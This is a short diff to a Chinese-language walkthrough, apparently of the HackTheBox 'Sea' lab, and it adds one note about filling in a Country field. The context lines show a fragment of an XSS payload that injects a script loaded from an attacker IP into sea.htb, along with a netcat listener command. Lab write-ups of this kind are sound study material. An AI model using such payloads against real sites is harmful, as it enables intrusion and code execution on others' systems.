@@ -148,6 +148,7 @@ http://sea.htb/index.php?page=LoginURL"></form><script+src="http://10.10.14.149:
 ![傻呵呵的一天](images/091003.pgn)
 #### [★]$ nc -lvvp 4444它是没反应的
 ### 在浏览器按FN 12，打开控制台
+#### Country可以填写United Kingdon
 ![傻呵呵的一天](images/091004.png)
 #### 尝试从完整 URL 中提取出“基础路径”或者“主机地址”，方便拼接其他路径
 #### 是按照exploit.py里面的命令进行测试的
